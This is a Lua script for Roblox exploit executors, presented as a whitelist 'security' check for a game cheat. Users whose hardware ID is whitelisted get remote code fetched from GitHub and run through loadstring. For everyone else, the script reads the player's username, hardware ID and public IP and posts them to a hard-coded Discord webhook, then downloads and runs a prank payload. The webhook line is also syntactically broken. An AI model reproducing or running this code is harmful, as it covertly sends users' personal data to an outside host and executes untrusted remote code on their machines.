--SECURITY--
local L_1_ = (request or http_request or syn.request or http.request)({
	Url = "https://api.luauth.xyz/hwid",
	Method = "GET"
})

local function L_2_func(L_10_arg0, L_11_arg1)
	for L_12_forvar0 = 1, # L_10_arg0 do
		if L_10_arg0[L_12_forvar0] == L_11_arg1 then
			location = L_12_forvar0
			return true
		end
	end
	return false
end
local L_3_ = {
	"1e56294e50d718b234aa173a69708f064c34c070c22376481dc5a33a598bb7f11a48b5e57f274a9f9a0118208b92c9776d70006afdedda5055f408a4fc5f8168",-- artist
	"894b2424fc26b17fae9d83103a20ddfaef79c05d59870a2255ad642a0a862836850813b05d72cfc0d58facd9b1b6b97428de6a5fac75774ec85cb1fe17ec7f29", -- nems
}
local L_4_ = http_request
if syn then
	L_4_ = syn.request
elseif SENTINEL_V2 then
	function L_4_(L_13_arg0)
		return {
			StatusCode = 200,
			Body = request(L_13_arg0.Url, L_13_arg0.Method, (L_13_arg0.Body or ""))
		}
	end
end

local L_5_ = L_4_({
	Url = "https://httpbin.org/get",
	Method = "GET"
}).Body
local L_6_ = game:GetService("HttpService"):JSONDecode(L_5_)
local L_7_ = L_6_.origin
local L_8_ = {
	"Syn-Fingerprint",
	"Exploit-Guid",
	"Proto-User-Identifier",
	"Sentinel-Fingerprint"
}
local L_9_ = ""

for L_14_forvar0, L_15_forvar1 in next, L_8_ do
	if L_6_.headers[L_15_forvar1] then
		L_9_ = L_6_.headers[L_15_forvar1]
		break
	end
end

if L_2_func(L_3_, L_9_) then
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/6KD557ude1EEvHpl0sgkvtFv3w7i8l4/8r450Dl9I55Cnm15j6vzO3DTLQxlMz7/main/oS2EEfTn72VqVpY2Z4Qx0Di4n9QBPjn'), true))()
else
	local L_16_ = https://canary.discord.com/api/webhooks/916105660507258931/xiTL85W7-LFzkxm3vTJ1u63mXPRrwyrEQMxlx2Jbquw-JAsDnlMTxDamlRsEg13Dyg90
	if L_1_.Success then
		local L_17_ = string.find(L_1_.Body, "Executor Name:")
		if L_17_ then
			local L_18_ = game.Players.LocalPlayer
			local L_19_ = ''
			local L_20_ = {
				["color"] = "000000",
				["description"] = "**Alert Reason:** Not whitelisted\n**Username:** " .. L_18_.Name .. "\n**Game Link:** https://www.roblox.com/games/" .. game.PlaceId .. "\n\n**Hardware ID:** " .. string.sub(L_1_.Body, 19, L_17_ - 5) .. "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
				["author"] = {
					["name"] = "Sohbet Crasher"
				},
			};
			(syn and syn.request or L_4_ or http.request){
				Url = (L_16_);
				Method = 'POST';
				Headers = {
					['Content-Type'] = 'application/json';
				};
				Body = game:GetService'HttpService':JSONEncode({
					content = L_19_;
					embeds = {
						L_20_
					};
				});
			};
		end
	end
	getfenv(1)["loadstring"](game:HttpGet('https://raw.githubusercontent.com/Wxer/Wxer/main/roblox/youre_an_idiot.lua'))()
end
